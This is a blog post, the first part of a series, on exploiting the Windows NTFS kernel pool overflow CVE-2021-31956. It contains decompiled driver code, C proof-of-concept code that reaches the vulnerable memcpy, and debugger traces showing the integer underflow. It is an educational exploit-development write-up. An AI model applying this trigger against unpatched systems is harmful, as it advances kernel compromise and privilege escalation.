# Windows Kernel Pool Exploitation `CVE-2021-31956` - Part 1

This blog post is about a Windows Kernel Paged Pool Overflow going by the identifier `CVE-2021-31956` and how to exploit it from a `Low Integrity` point of view. This blog post does not include any novel exploitation techniques, but if you are curious about a Kernel Heap Overflow and how an exploit and all the required steps might look like, you're at the right address.

I intentionally will talk about my failures. While it's hard to admit them publicly I like to think that it helps people try more stuff and get into fields they might have scared them off.


## Starting Point

I started this journey with the information provided from [this securelist blog post](https://securelist.com/puzzlemaker-chrome-zero-day-exploit-chain/102771/) and while other writeups exist ([1](https://www.nccgroup.com/us/research-blog/cve-2021-31956-exploiting-the-windows-kernel-ntfs-with-wnf-part-1/), haven't read it yet) 
about this bug itself and the exploitation I set the following restrictions to myself:

* Has to work from `Low Integrity` execution level (No `NtQuerySystemInformation` / `EnumDeviceDrivers`)
* No further information (blog posts,...) about the bug itself other than the securelist blog post
* Use the `Scoop the Windows pool` technique presented by Corentin Bayet and Paul Fariello of Synack [link to paper](https://www.sstic.org/media/SSTIC2020/SSTIC-actes/pool_overflow_exploitation_since_windows_10_19h1/SSTIC2020-Article-pool_overflow_exploitation_since_windows_10_19h1-bayet_fariello.pdf)


The securelist blog post did give us the following information (and reading it in hindsight even a bit more):
* Integer Underflow leading to an Overflow
* Vulnerability lies inside the `ntfs.sys` drivers' `NtfsQueryEaUserEaList` function
* The actual researcher/VR/XDev used the Windows Notification Facility (WNF) to turn the overflow into an arbitrary read/write

With the starting point settled, let's dive into the bug itself.

## The Bug

I started by reversing the `ntfs.sys` driver, particularly the function of interest `NtfsQueryEaUserEaList` and it's caller functions. With the information from the securelist blog post it's easy to see where things can go wrong.
The crucial part is to discard all paths we don't want to take, which are of course code paths not leading to the vulnerability or leading to the vulnerability in an unexploitable state. Next I tried to make the decompilation of the `NtfsQueryEaUserEaList` as pretty and understandable as possible, at least the parts we cared for.
This means naming variables, writing some comments (don't go into this `if`, underflow here, ...). This helps so much, years ago I skipped these "minor details" just to struggle with missing information later on or even worse an "understanding" based on wrong assumptions.

During dynamic analysis (running a PoC with a debugger attached) we again see if things are going well (we reach the vulnerable function `NtfsQueryEaUserEaList`) and reach the vulnerable part of the function. If not, see where we diversed from 
the track and work towards it. This is a step by step process, at least sometimes. 


The following is a simplified version of the function in question:

```C
int128_t* NtfsQueryEaUserEaList(int128_t* arg1, PFILE_FULL_EA_INFORMATION user_file_full_ea_info, void* arg3, int64_t memcpy_dst_pool_base_addr, int32_t out_buf_len, void* arg6, char arg7)

int32_t padding = 0;
while (true) {
    if (NtfsIsEaNameValid(&ea_name_to_find) == 0) {
        // we don't wanna go here, so ensure that EaName is valid
        // snip 8<
    }

    // NtfsLocateEaByName returns 1 if name is found, 0 otherwise
    // As we want to not go into the `if` statement, the EA name we look for should be within the EAs of the file
    while (true) {
        if (NtfsLocateEaByName(file_full_ea_info: user_file_full_ea_info, file_full_ea_info_len: *(arg3 + 4), &ea_name_to_find, _out_ea_offset: &corresponding_offset_into_ea) == 0) {
           // snip 8<
            goto skip_memcpy_vuln   
        }
                  
        int64_t* ea_name_val_block = zx.q(corresponding_offset_into_ea) + user_file_full_ea_info
        block_size = zx.d(*(ea_name_val_block + 5)) + 9 + zx.d(*(ea_name_val_block + 6))
                  
        // integer underflow possible 
        if (block_size u> out_buf_len - padding)
            // snip 8<
            goto exit_out
                  
        // according to the kaspersky blog post here is the overflow
        memcpy(out_buf_pos, ea_name_val_block, zx.q(block_size))
        *out_buf_pos = 0
        skip_memcpy_vuln:
        some_offset_2 = some_offset + block_size + padding
        some_offset_1 = some_offset_2

        if (out_buf_pos_1 != 0)
            *out_buf_pos_1 = out_buf_pos.d - out_buf_pos_1.d

        out_buf_pos_1 = out_buf_pos
        out_buf_len -= block_size + padding
        padding = ((block_size + 3) & 0xfffffffc) - block_size
        goto label_1c01c2c5a
    }
    label_1c01c2c5a:
    rbx += r14_1
}
```

We will go into more detail about the vulnerability in a bit, for now, this gives us an idea. Next I wanted to create a PoC which is able to reach that functionality. 


## Where PoC?

So how do we reach that function? Feeling super smart I just set a breakpoint on said function and waited for the OS to do the job for me. Giving me callstacks like the one shown below:

```
0: kd> bp ntfs!NtfsQueryEaUserEaList
0: kd> g
Breakpoint 1 hit
Ntfs!NtfsQueryEaUserEaList:
fffff806`20bac124 4c894c2420      mov     qword ptr [rsp+20h],r9
0: kd> k
 # Child-SP          RetAddr               Call Site
00 ffff868a`2f29e238 fffff806`20babc7a     Ntfs!NtfsQueryEaUserEaList
01 ffff868a`2f29e240 fffff806`20c0c8a6     Ntfs!NtfsCommonQueryEa+0x22a
02 ffff868a`2f29e3a0 fffff806`20c0c600     Ntfs!NtfsFsdDispatchSwitch+0x286
03 ffff868a`2f29e4d0 fffff806`1dad1f35     Ntfs!NtfsFsdDispatchWait+0x40
04 ffff868a`2f29e770 fffff806`1a8c6ccf     nt!IofCallDriver+0x55
05 ffff868a`2f29e7b0 fffff806`1a8c48d3     FLTMGR!FltpLegacyProcessingAfterPreCallbacksCompleted+0x28f
06 ffff868a`2f29e820 fffff806`1dad1f35     FLTMGR!FltpDispatch+0xa3
07 ffff868a`2f29e880 fffff806`1ddeabfc     nt!IofCallDriver+0x55
08 ffff868a`2f29e8c0 fffff806`1ff4817d     nt!FsRtlQueryKernelEaFile+0x12c
09 ffff868a`2f29e930 fffff806`1ff513c7     CI!CipGetFileCache+0x2f9
0a ffff868a`2f29ea60 fffff806`1ff4f577     CI!CipValidateFileInCache+0xa3
0b ffff868a`2f29eb40 fffff806`1de7bdf5     CI!CiValidateImageHeader+0x3a7
0c ffff868a`2f29ecc0 fffff806`1de7b890     nt!SeValidateImageHeader+0xd9
0d ffff868a`2f29ed70 fffff806`1ddedf13     nt!MiValidateSectionCreate+0x438
0e ffff868a`2f29ef50 fffff806`1ddede41     nt!MiValidateSectionSigningPolicy+0xab
0f ffff868a`2f29efb0 fffff806`1ddeda37     nt!MiValidateExistingImage+0x371
10 ffff868a`2f29f060 fffff806`1dedf97d     nt!MiShareExistingControlArea+0xc7
11 ffff868a`2f29f090 fffff806`1dedf0f4     nt!MiCreateImageOrDataSection+0x1ad
12 ffff868a`2f29f180 fffff806`1dedeed7     nt!MiCreateSection+0xf4
13 ffff868a`2f29f300 fffff806`1dedecbc     nt!MiCreateSectionCommon+0x207
14 ffff868a`2f29f3e0 fffff806`1dc058b8     nt!NtCreateSection+0x5c
15 ffff868a`2f29f450 00007ffb`a430c704     nt!KiSystemServiceCopyEnd+0x28
16 000000f6`d192e468 00007ffb`a42d233a     ntdll!NtCreateSection+0x14
17 000000f6`d192e470 00007ffb`a42d218c     ntdll!LdrpMapDllNtFileName+0x14a
18 000000f6`d192e570 00007ffb`a42d152f     ntdll!LdrpMapDllFullPath+0xe0
19 000000f6`d192e700 00007ffb`a42a4c4b     ntdll!LdrpProcessWork+0x123
1a 000000f6`d192e760 00007ffb`a42ac414     ntdll!LdrpLoadDllInternal+0x13f
1b 000000f6`d192e7e0 00007ffb`a42ac612     ntdll!LdrpLoadForwardedDll+0x138
1c 000000f6`d192eaf0 00007ffb`a4292b97     ntdll!LdrpGetDelayloadExportDll+0xa2
1d 000000f6`d192ec00 00007ffb`a42a4196     ntdll!LdrpHandleProtectedDelayload+0x87
1e 000000f6`d192f1d0 00007ffb`a3c9c7d2     ntdll!LdrResolveDelayLoadedAPI+0xc6
1f 000000f6`d192f260 00000000`00000001     0x00007ffb`a3c9c7d2
20 000000f6`d192f268 00007ffb`a3ec61e8     0x1
21 000000f6`d192f270 00000000`00000000     0x00007ffb`a3ec61e8
```

Long story short, this led me into unnecessary rabbit holes reversing `ntdll!NtCreateSection`, `ntdll!LdrResolveDelayLoadedAPI` and other functions within this callstack or the functions of other callstacks leading up to `NtfsQueryEaUserEaList` while it was an ego thing with the idea of using as little as available information, I callend an end to that exercise.

Further googling about extended attributes (EAs) within `NTFS` was the better choice, getting an understanding of the technology, seeing code samples of developers using them etc. Surprise surprise there are dedicated functions for this!
One great blog post was [https://hex.pp.ua/extended-attributes.php](https://hex.pp.ua/extended-attributes.php) which listed structures and the API calls `NtQueryEaFile` and `NtSetEaFile` also including example code to query and set EAs.

```C
NTSTATUS
NtSetEaFile(
    IN HANDLE FileHandle,
    IN PIO_STATUS_BLOCK IoStatusBlock,
    PVOID EaBuffer,
    ULONG EaBufferSize
);

NTSTATUS
NtQueryEaFile(
    IN HANDLE FileHandle,
    OUT PIO_STATUS_BLOCK IoStatusBlock,
    OUT PVOID Buffer,
    IN ULONG Length,
    IN BOOLEAN ReturnSingleEntry,
    IN PVOID EaList OPTIONAL,
    IN ULONG EaListLength,
    IN PULONG EaIndex OPTIONAL,
    IN BOOLEAN RestartScan
);
```

This was great, I adapted the code to fit my use case (based on the vulnerable code I knew I had to use more than one EA). The code did try to set two or three EAs into a file using `NtSetEaFile` and then should read these through `NtQueryEaFile`.

Building the exe, attaching a kernel debugger to the vulnerable host, setting a breakpoint on `NtfsQueryEaUserEaList` stemming from the respective process (you'll see an how this is done later on) and we run into errors before even calling `NtQueryEaFile`.
The first errors while trying to set multiple attributes then errors trying to query the attributes. The issues mostly stemmed from the fact that we need to set the fields `NextEntryOffset`, `EaNameLength` and `EaValueLength` precisely.

```C
typedef struct _FILE_FULL_EA_INFORMATION
{
    ULONG NextEntryOffset;
    UCHAR Flags;
    UCHAR EaNameLength;
    USHORT EaValueLength;
    CHAR EaName[1];
} FILE_FULL_EA_INFORMATION, *PFILE_FULL_EA_INFORMATION;
```

Also the `EaName` must not contain any non-ascii characters, this will be important later on. Having figured that out, I tried to simplify it and used the same name and value lengths for the EAs I wanted to set. In hindsight I should have made it modular from the get go.

Now finally, compiling, setting a breakpoint, execution aaand ... nothing. Didn't hit `NtfsQueryEaUserEaList`. First I though it might have something to do with the `Flags` field, but this was not the case.
In hindsight again it was obvious, the vulnerable function has `EaList` in it's name and I hadn't set the `EaList` and `EaListLength` parameters:

```
    IN PVOID EaList OPTIONAL,
    IN ULONG EaListLength,
```

However I came only to that conclusion after reversing more (up the callstack), debugging and trial and error (`goto: reversing`) that I did miss that.

Eventually I was able to trigger the vulnerable function. So let's figure out how we are getting that overflow next. This was the source code of the PoC at that time:

```c
#include <windows.h>
#include <stdio.h>
#include <ntstatus.h>
#include <winternl.h>

// Ressources:
// https://securelist.com/puzzlemaker-chrome-zero-day-exploit-chain/102771/
// https://hex.pp.ua/extended-attributes.php
// https://github.com/uvbs/obfuscation-crypto-repo/blob/master/Krypton_7.1/Bin/SYS/ntundoc.h
// http://undocumented.ntinternals.net/index.html?page=UserMode%2FUndocumented%20Functions%2FNT%20Objects%2FFile%2FFILE_GET_EA_INFORMATION.html
// 

#define STATUS_INVALID_EA_NAME           ((NTSTATUS)0x80000013L)
#define STATUS_EA_LIST_INCONSISTENT      ((NTSTATUS)0x80000014L)
#define STATUS_EA_TOO_LARGE              ((NTSTATUS)0xC0000050L)
#define STATUS_EAS_NOT_SUPPORTED         ((NTSTATUS)0xC000004FL)
#define STATUS_EA_CORRUPT_ERROR          ((NTSTATUS)0xC0000053L)

#define MAX_EA_NAME_LEN 255


// Function prototypes for the Native API functions
typedef NTSTATUS(NTAPI* NtSetEaFile_t)(
    HANDLE FileHandle,
    PIO_STATUS_BLOCK IoStatusBlock,
    PVOID Buffer,
    ULONG Length
    );

typedef NTSTATUS(NTAPI* NtQueryEaFile_t)(
    HANDLE FileHandle,
    PIO_STATUS_BLOCK IoStatusBlock,
    PVOID Buffer,
    ULONG Length,
    BOOLEAN ReturnSingleEntry,
    PVOID EaList,
    ULONG EaListLength,
    PULONG EaIndex,
    BOOLEAN RestartScan
    );

#define EA_NAME  "User.Comment321"
#define EA_NAME2 "User.Comment222"
#define EA_NAME_LENGTH (sizeof(EA_NAME) - 1)
#define EA_NAME_LENGTH2 (sizeof(EA_NAME2) - 1)



typedef struct _FILE_FULL_EA_INFORMATION {
    ULONG NextEntryOffset;
    UCHAR Flags;
    UCHAR EaNameLength;
    USHORT EaValueLength;
    CHAR EaName[1];
} FILE_FULL_EA_INFORMATION, * PFILE_FULL_EA_INFORMATION;

typedef struct _FILE_GET_EA_INFORMATION {
    ULONG                   NextEntryOffset;
    BYTE                    EaNameLength;
    CHAR                    EaName[1];
} FILE_GET_EA_INFORMATION, * PFILE_GET_EA_INFORMATION;


void query_extended_attributes(HANDLE hFile, NtQueryEaFile_t NtQueryEaFile) {
    ULONG queryBufferSize = 1024;
    PFILE_FULL_EA_INFORMATION queryBuffer = (PFILE_FULL_EA_INFORMATION)malloc(queryBufferSize);
    if (!queryBuffer) {
        printf("Memory allocation error\n");
        return;
    }

    ULONG eaBufferSize = 9 + EA_NAME_LENGTH;

    PFILE_GET_EA_INFORMATION file_get_ea_inf1 = (PFILE_GET_EA_INFORMATION)malloc(eaBufferSize);
    PFILE_GET_EA_INFORMATION file_get_ea_inf2 = (PFILE_GET_EA_INFORMATION)malloc(eaBufferSize);

    file_get_ea_inf1->NextEntryOffset = eaBufferSize;
    file_get_ea_inf1->EaNameLength = EA_NAME_LENGTH;
    file_get_ea_inf2->NextEntryOffset = 0;
    file_get_ea_inf2->EaNameLength = EA_NAME_LENGTH;

    memcpy(file_get_ea_inf1->EaName, EA_NAME, EA_NAME_LENGTH + 1);
    memcpy(file_get_ea_inf2->EaName, EA_NAME2, EA_NAME_LENGTH + 1);



    char* buf = (char*)malloc(eaBufferSize * 2);
    memcpy(buf, file_get_ea_inf1, eaBufferSize);
    memcpy(buf + eaBufferSize, file_get_ea_inf2, eaBufferSize);



    ULONG eaIndex = 0;

    /* END TESTS */

    IO_STATUS_BLOCK ioStatus;
    NTSTATUS status = NtQueryEaFile(hFile, &ioStatus, queryBuffer, queryBufferSize, FALSE, buf, eaBufferSize*2, &eaIndex, TRUE);
    //NTSTATUS status = NtQueryEaFile(hFile, &ioStatus, queryBuffer, queryBufferSize, FALSE, 0, 0, 0, TRUE);

    if (status != STATUS_SUCCESS) {
        printf("NtQueryEaFile error: %08x\n", status);
        free(queryBuffer);
        return;
    }

    printf("Extended attributes queried successfully\n");

    PFILE_FULL_EA_INFORMATION eaEntry = queryBuffer;
    do {
        printf("EA Name: %.*s\n", eaEntry->EaNameLength, eaEntry->EaName);
        printf("EA Value: %.*s\n", eaEntry->EaValueLength, eaEntry->EaName + eaEntry->EaNameLength + 1);

        if (eaEntry->NextEntryOffset == 0)
            break;

        eaEntry = (PFILE_FULL_EA_INFORMATION)((PUCHAR)eaEntry + eaEntry->NextEntryOffset);
    } while (TRUE);

    free(queryBuffer);
}


BOOL set_extended_attributes(HANDLE hFile, NtSetEaFile_t NtSetEaFile) {

    // Set extended attribute
    CHAR eaValue[] = "This is a comment123";
    CHAR eaValue2[] = "This is a comment124";
    ULONG eaValueLength = sizeof(eaValue);

    ULONG eaBufferSize = sizeof(FILE_FULL_EA_INFORMATION) + EA_NAME_LENGTH + eaValueLength;
    PFILE_FULL_EA_INFORMATION eaBuffer1 = (PFILE_FULL_EA_INFORMATION)malloc(eaBufferSize);
    PFILE_FULL_EA_INFORMATION eaBuffer2 = (PFILE_FULL_EA_INFORMATION)malloc(eaBufferSize);


    if (!eaBuffer1 || !eaBuffer2) {
        printf("Memory allocation error\n");
        CloseHandle(hFile);
        return 0;
    }

    eaBuffer1->NextEntryOffset = eaBufferSize;
    eaBuffer1->Flags = 0x80;
    eaBuffer1->EaNameLength = EA_NAME_LENGTH;
    eaBuffer1->EaValueLength = eaValueLength;
    memcpy(eaBuffer1->EaName, EA_NAME, EA_NAME_LENGTH + 1);
    memcpy(eaBuffer1->EaName + EA_NAME_LENGTH + 1, eaValue, eaValueLength);

    IO_STATUS_BLOCK ioStatus;
    //NTSTATUS status = NtSetEaFile(hFile, &ioStatus, eaBuffer, eaBufferSize);


    
    // second EA
    eaBuffer2->NextEntryOffset = 0;
    eaBuffer2->Flags = 0x80;
    eaBuffer2->EaNameLength = EA_NAME_LENGTH2;
    eaBuffer2->EaValueLength = eaValueLength;
    memcpy(eaBuffer2->EaName, EA_NAME2, EA_NAME_LENGTH2 + 1);
    memcpy(eaBuffer2->EaName + EA_NAME_LENGTH2 + 1, eaValue2, eaValueLength);

    char* buf = (char*)malloc(eaBufferSize * 2);
    memcpy(buf, eaBuffer1, eaBufferSize);
    memcpy(buf + eaBufferSize, eaBuffer2, eaBufferSize);

    NTSTATUS status = NtSetEaFile(hFile, &ioStatus, buf, eaBufferSize*2);

    if (status != STATUS_SUCCESS) {
        printf("NtSetEaFile error: %08x\n", status);
        free(buf);
        free(eaBuffer1);
        free(eaBuffer2);
        CloseHandle(hFile);
        return 0;
    }
    

    printf("Extended attribute set successfully\n");
    return 1;
}


int main() {
    // Load ntdll.dll and get the addresses of the functions
    HMODULE ntdll = LoadLibraryA("ntdll.dll");
    if (!ntdll) {
        printf("Error loading ntdll.dll\n");
        return 1;
    }

    NtSetEaFile_t NtSetEaFile = (NtSetEaFile_t)GetProcAddress(ntdll, "NtSetEaFile");
    NtQueryEaFile_t NtQueryEaFile = (NtQueryEaFile_t)GetProcAddress(ntdll, "NtQueryEaFile");

    if (!NtSetEaFile || !NtQueryEaFile) {
        printf("Error finding NtSetEaFile or NtQueryEaFile\n");
        return 1;
    }

    // File to set/query extended attributes
    const char* fileName = "example.txt";
    HANDLE hFile = CreateFileA(fileName, GENERIC_READ | GENERIC_WRITE, 0, NULL, OPEN_EXISTING, FILE_FLAG_BACKUP_SEMANTICS, NULL);
    if (hFile == INVALID_HANDLE_VALUE) {
        printf("Error opening file: %lu\n", GetLastError());
        return 1;
    }

    set_extended_attributes(hFile, NtSetEaFile);

    printf("[>] Continue to do a NtQueryEaFile? > ");
    getchar();

    query_extended_attributes(hFile, NtQueryEaFile);

    CloseHandle(hFile);
    return 0;
}
```


Setting a breakpoint before the `memcpy` happens within `NtfsQueryEaUserEaList` and after the breakpoint got hit brings us this state:

```

1: kd> 
Ntfs!NtfsQueryEaUserEaList+0x1c5:
fffff800`61b8c2e9 e81258f5ff      call    Ntfs!memcpy (fffff800`61ae1b00)
1: kd> r rcx, rdx, r8, r9
rcx=ffff9c8a59465b70 rdx=ffffc48e60e2dd88 r8=000000000000002d r9=fffffb0ddb55ebf0
1: kd> db ffff9c8a59465b70 l60
ffff9c8a`59465b70  00 00 00 00 00 00 00 00-00 00 00 00 00 00 00 00  ................
ffff9c8a`59465b80  00 00 00 00 00 00 00 00-00 00 00 00 00 00 00 00  ................
ffff9c8a`59465b90  00 00 00 00 00 00 00 00-00 00 00 00 00 00 00 00  ................
ffff9c8a`59465ba0  00 00 00 00 00 00 00 00-00 00 00 00 00 00 00 00  ................
ffff9c8a`59465bb0  00 00 00 00 00 00 00 00-00 00 00 00 00 00 00 00  ................
ffff9c8a`59465bc0  00 00 00 00 00 00 00 00-00 00 00 00 00 00 00 00  ................


1: kd> !pool @rcx
unable to get nt!PspSessionIdBitmap
Pool page ffff9c8a59465b70 region is Paged pool
 ffff9c8a59465000 size:   30 previous size:    0  (Free)       ....
 ffff9c8a59465040 size:  580 previous size:    0  (Allocated)  Ntff
 ffff9c8a594655d0 size:  580 previous size:    0  (Allocated)  Ntff
*ffff9c8a59465b60 size:  440 previous size:    0  (Allocated) *NtFE
		Pooltag NtFE : Ea.c, Binary : ntfs.sys
 ffff9c8a59465fa0 size:   40 previous size:    0  (Free)       m.+^
```

We can see that we have allocated a chunk of size `0x440` and the chunk resides within the Paged pool.


Inspecting the source data:


```
1: kd> db @rdx l85
ffffc48e`60e2dd88  30 00 00 00 80 0f 15 00-55 53 45 52 2e 43 4f 4d  0.......USER.COM
ffffc48e`60e2dd98  4d 45 4e 54 33 32 31 00-54 68 69 73 20 69 73 20  MENT321.This is 
ffffc48e`60e2dda8  61 20 63 6f 6d 6d 65 6e-74 31 32 33 00 00 6f 00  a comment123..o.
ffffc48e`60e2ddb8  2c 00 00 00 80 0d 15 00-55 53 45 52 2e 43 4f 4d  ,.......USER.COM
ffffc48e`60e2ddc8  4d 45 4e 54 32 00 54 68-69 73 20 69 73 20 61 20  MENT2.This is a 
ffffc48e`60e2ddd8  63 6f 6d 6d 65 6e 74 31-32 34 00 42 00 00 00 00  comment124.B....
ffffc48e`60e2dde8  ff ff ff ff 82 79 47 11-00 00 00 00 00 00 00 00  .....yG.........
ffffc48e`60e2ddf8  00 00 00 00 00 00 00 00-00 00 00 00 00 00 00 00  ................
ffffc48e`60e2de08  00 00 00 00 00                                   .....

```

The source is the EA name and EA value. During normal execution the source data we would actually copy is of length `0x2d` (for this EA)

```
1: kd> db @rdx l2d
ffffc48e`60e2dd88  30 00 00 00 80 0f 15 00-55 53 45 52 2e 43 4f 4d  0.......USER.COM
ffffc48e`60e2dd98  4d 45 4e 54 33 32 31 00-54 68 69 73 20 69 73 20  MENT321.This is 
ffffc48e`60e2dda8  61 20 63 6f 6d 6d 65 6e-74 31 32 33 00           a comment123.
```

So the EA name and value get copied into the destination, one by one. With that understanding it's time to revisit the vulnerability again and see how we would be able to trigger it.




### Getting the Overflow

We finished off with code thats finally able to reach the vulnerable function. The next step for me was to get a better understanding of the vulnerability and the overall logic of the function.
After all, we just want to have a four byte overflow of controlled/arbitrary data into the next chunk.

Through reversing we know that the destination buffer used during the `memcpy` is allcoated on the Paged Pool within `NtfsCommonQueryEa` (caller of the vulnerable function) and stems from the respective `IRP`. 



Subsequent dynamic testing where we modify the `queryBufferSize` within our `NtQueryEaFile` call showed, that the allocation within the kernel space is the user controllable `queryBufferSize + sizeof(PoolMetadata)` (the size of the `PoolMetadata` differs for the respective backend allocator). 

That we have much control over the allocated kernel buffer is great as it gives us quite an amount of flexibility regarding the backend allocator we want to use (LFH,VS), the bucket size and potentially better control of the overflow. Of course we have to ensure that the different sizes result in an exploitable condition.


Looking back at the decompilation and the disassembly in addition to inspecting the involved registers leaves us with the following simplification of the bug:


```C
char *output_buf = malloc(out_buf_len+sizeof(PoolMetadata));
int padding = 0

while (true) {
    EA ea_name_val_block = offset_into_curr_ea + user_file_full_ea_info
    uint32_t block_size = ea_name_val_block.name_len + ea_name_val_block.val_len + 9;

    if (block_size < out_buf_len - padding)
        break

    memcpy(output_buf, curr_ea_name_val_pair, size_of_ea_name_val_pair);

    out_buf_len -= block_size + padding
    padding = ((block_size + 3) & 0xfffffffc) - block_size
    output_buf += block_size + padding
}
```

The possible values for padding are `0-3`. So when `output_buf_len` gets to `0-2` and padding becomes `3` we get an integer overflow and pass the check while the actual buffer does not have enough space for the EA to be copied into.

We do pass the check due to an unsigned comparison. If the left parameter is an `unsigned int` and the right parameter is an `int` within the comparison, the right parameter will be casted/promoted to an `unsinged int` too, creating the exploitable condition. You can read more about this in the chapter `Chapter 6 - C Language Issues: Type Conversion`. Below is an excerpt of the table describing the conversion we saw.


![Integer Conversion](images/blogpost_screenshot_integer_conversion.PNG)



I adapted the code with the PoC to use a `output_buf_len` of `0x143`, below I'll show you the states leading to the discussed comparisons.

```
// Get the `_EPROCESS` address of our process
0: kd> !process 0 0 CVE-2021-31956.exe
PROCESS ffff9b8e92ad3340
    SessionId: 1  Cid: 1980    Peb: f581868000  ParentCid: 0b44
    DirBase: 22d917000  ObjectTable: ffffd8892f128d40  HandleCount: 283305.
    Image: CVE-2021-31956.exe

// Set a breakpoint just before the interesting part happens
0: kd> ba e1 /p ffff9b8e92ad3340 ntfs+00000000`000dc2b7
0: kd> g
Breakpoint 1 hit
Ntfs!NtfsQueryEaUserEaList+0x193:
fffff803`0cb8c2b7 4903d6          add     rdx,r14

// snip

/// 1. Iteration (first EA)

// subtract padding from out_buf_len, first time no padding
0: kd> t
Ntfs!NtfsQueryEaUserEaList+0x196:
fffff803`0cb8c2ba 412bc7          sub     eax,r15d
1: kd> r eax, r15d
eax=143 r15d=0


// if (block_size u> out_buf_len - padding) // r14d=block_size; eax=(out_buf_len-padding)
1: kd> t
Ntfs!NtfsQueryEaUserEaList+0x1a9:
fffff803`0cb8c2cd 443bf0          cmp     r14d,eax

1: kd> r r14d, eax
r14d=99 eax=143
```

So we pass the validation, go into the `memcpy` and the padding value will be set to `3`, I just wrote a simple `C` program to do the calcuation for me:

```C
#include<stdio.h>

int main() {

	int block_size = 0x99;

	int padding = ((block_size + 3) & 0xfffffffc) - block_size;
	printf("padding: %d\n", padding);
	return 0;
}

```

```bash
user@user:/tmp$ gcc a.c -o a && ./a
padding: 3
```

After all, it's just padding' up to be a multiple of four, but doing it this way leaves less room for errors, especially while I'm not perfect with doing hex calculations and conversions within my head.

Proceeding to the `memcpy` and inspecting the memory afterwards:

```
// pc - continue up to the next `call` instruction
1: kd> pc
Ntfs!NtfsQueryEaUserEaList+0x1c5:
fffff803`0cb8c2e9 e81258f5ff      call    Ntfs!memcpy (fffff803`0cae1b00)

// calling convention is function_call(rcx, rdx, r8, r9, <values on stack>)
1: kd> r rcx, rdx, r8
rcx=ffffd889349859d0 rdx=ffffc60a464810e0 r8=0000000000000099

// step over the execution
1: kd> p
Ntfs!NtfsQueryEaUserEaList+0x1ca:
fffff803`0cb8c2ee 41897d00        mov     dword ptr [r13],edi

// inspect the written data
1: kd> db ffffd889349859d0 l0x99
ffffd889`349859d0  9c 00 00 00 00 0f 81 00-55 53 45 52 2e 43 4f 4d  ........USER.COM
ffffd889`349859e0  4d 45 4e 54 33 32 31 00-54 68 69 73 20 69 73 20  MENT321.This is 
ffffd889`349859f0  61 20 63 6f ff 6d 65 6e-74 31 32 33 41 41 41 41  a co.ment123AAAA
ffffd889`34985a00  42 42 42 42 43 43 43 43-44 44 44 44 45 45 45 45  BBBBCCCCDDDDEEEE
ffffd889`34985a10  46 46 46 46 41 41 41 41-42 42 42 42 43 43 43 43  FFFFAAAABBBBCCCC
ffffd889`34985a20  44 44 44 44 45 45 45 45-46 46 46 46 47 47 47 47  DDDDEEEEFFFFGGGG
ffffd889`34985a30  48 48 48 48 4a 4a 4a 4a-4b 4b 4b 4b 4c 4c 4c 4c  HHHHJJJJKKKKLLLL
ffffd889`34985a40  4d 4d 4d 4d 4e 4e 4e 4e-4f 4f 4f 4f 50 50 50 50  MMMMNNNNOOOOPPPP
ffffd889`34985a50  01 02 03 04 05 06 07 08-01 02 03 04 05 06 07 08  ................
ffffd889`34985a60  01 02 03 04 05 06 07 08-00                       .........
```

So we can confirm that the first EA is successfully written into the buffer. Lets continue and see what the next iteration does:


```
1: kd> g
Breakpoint 1 hit

/// 2. Iteration (second EA)
1: kd> t
Ntfs!NtfsQueryEaUserEaList+0x196:
fffff803`0cb8c2ba 412bc7          sub     eax,r15d

1: kd> r eax, r15d
eax=aa r15d=3

1: kd> ?143-99
Evaluate expression: 170 = 00000000`000000aa
```

`0xaa` is the result of our original `output_buf_len` minus the previous `block_size` of `0x99`. And as we already calculated the padding is `3`. 


```
// if (block_size u> out_buf_len - padding) // r14d=block_size; eax=(out_buf_len-padding)
1: kd> t
Ntfs!NtfsQueryEaUserEaList+0x1a9:
fffff803`0cb8c2cd 443bf0          cmp     r14d,eax

1: kd> r r14d, eax
r14d=a5 eax=a7
```

We again pass the validation as `0xa5` is smaller than `0xa7`. We continue directly to the third iteration and skip the `memcpy` inspection this time.


```
1: kd> g
Breakpoint 1 hit

1: kd> t
Ntfs!NtfsQueryEaUserEaList+0x196:
fffff803`0cb8c2ba 412bc7          sub     eax,r15d

1: kd> r eax, r15d
eax=2 r15d=3

1: kd> t

1: kd> r eax
eax=ffffffff
```

This time we have a `out_buf_len` of `2` and a padding of `3` during the `sub` instruction, which leads to an `eax` value of `0xffffffff`.
This is the integer underflow we were talking about all that time! We got it. So we just have a remaining space of two bytes within our buffer but we are going to reach the `memcpy`.


```
1: kd> t
Ntfs!NtfsQueryEaUserEaList+0x1a9:
fffff803`0cb8c2cd 443bf0          cmp     r14d,eax

1: kd> r r14d, eax
r14d=10 eax=ffffffff
```

The last EA block size is `0x10` and is `0xffffffff` (`out_buf_len-padding`) larger than that? At least for unsigned comparison it is.

Inspecting the state of the pool buffers before the `memcpy`

```
1: kd> !pool ffffd88934985b14
Pool page ffffd88934985b14 region is Paged pool
// snip
*ffffd889349859c0 size:  160 previous size:    0  (Allocated) *NtFE
		Pooltag NtFE : Ea.c, Binary : ntfs.sys
 ffffd88934985b20 size:  160 previous size:    0  (Allocated)  NpAt
// snip

// data in chunk and start of adjacent chunk before the third memcpy leading to the overflow
1: kd> db ffffd889349859c0 l180
ffffd889`349859c0  00 00 16 03 4e 74 46 45-00 00 00 00 00 00 00 00  ....NtFE........
ffffd889`349859d0  9c 00 00 00 00 0f 81 00-55 53 45 52 2e 43 4f 4d  ........USER.COM
ffffd889`349859e0  4d 45 4e 54 33 32 31 00-54 68 69 73 20 69 73 20  MENT321.This is 
ffffd889`349859f0  61 20 63 6f ff 6d 65 6e-74 31 32 33 41 41 41 41  a co.ment123AAAA
ffffd889`34985a00  42 42 42 42 43 43 43 43-44 44 44 44 45 45 45 45  BBBBCCCCDDDDEEEE
ffffd889`34985a10  46 46 46 46 41 41 41 41-42 42 42 42 43 43 43 43  FFFFAAAABBBBCCCC
ffffd889`34985a20  44 44 44 44 45 45 45 45-46 46 46 46 47 47 47 47  DDDDEEEEFFFFGGGG
ffffd889`34985a30  48 48 48 48 4a 4a 4a 4a-4b 4b 4b 4b 4c 4c 4c 4c  HHHHJJJJKKKKLLLL
ffffd889`34985a40  4d 4d 4d 4d 4e 4e 4e 4e-4f 4f 4f 4f 50 50 50 50  MMMMNNNNOOOOPPPP
ffffd889`34985a50  01 02 03 04 05 06 07 08-01 02 03 04 05 06 07 08  ................
ffffd889`34985a60  01 02 03 04 05 06 07 08-00 00 00 00 00 00 00 00  ................
ffffd889`34985a70  00 0f 8d 00 55 53 45 52-2e 43 4f 4d 4d 45 4e 54  ....USER.COMMENT
